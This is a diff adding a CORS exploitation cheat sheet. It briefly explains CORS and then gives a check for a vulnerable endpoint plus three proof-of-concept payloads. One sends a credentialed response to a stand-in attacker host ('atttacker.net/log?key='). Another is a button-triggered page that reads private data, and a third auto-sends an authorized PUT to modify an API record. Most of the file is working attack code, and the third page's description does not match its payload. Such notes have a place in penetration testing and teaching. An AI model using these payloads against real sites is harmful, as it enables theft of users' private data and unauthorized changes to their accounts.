@@ -1,0 +1,91 @@
+# CORS
+#
+# CORS allows the Same Origin Policy to be relaxed for a domain.
+# CORS allows a site A to give permission to site B to read (potentially
+# private) data from site A (using the visitor's browser and credentials).
+# CSP allows a site to prevent itself from loading (potentially
+# malicious) content from unexpected sources (e.g. as a defence against XSS).
+#
+#
+# Check if Vulnerable
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: https://evil.com
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+
+# GET Request - With Credentials
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+    };
+
+# PoC 2
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://victim.example.com/endpoint", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
+
+
+# JSON PUT - Complex Request
+<html>
+  <head>
+  <title>TEST CORS CSRF</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <script>
+  function put() {
+    var x = new XMLHttpRequest();
+    x.open("PUT",
+           "https://example.com/prod/api/books/admin/243");
+
+    x.setRequestHeader("Content-Type",
+                       "application/json;charset=utf-8"); 
+    x.setRequestHeader("Origin",
+                       "https://example.com"); 
+
+    // Insert a valid authorization token here
+    x.setRequestHeader("Authorization",
+                       "<insert_valid_authorization_token_here>");
+
+    x.send(JSON.stringify(
+    {"bookTitle":"Le barzellette di Totti",
+     "Author":"Francesco Totti",
+     "Year":"1999",
+     "price":"10000"}));
+  }
+
+  window.onload = put;
+  </script>
+  </head>
+  <body>
+      PUT Request to change opening/closing time of a shop.
+  </body>
+</html>
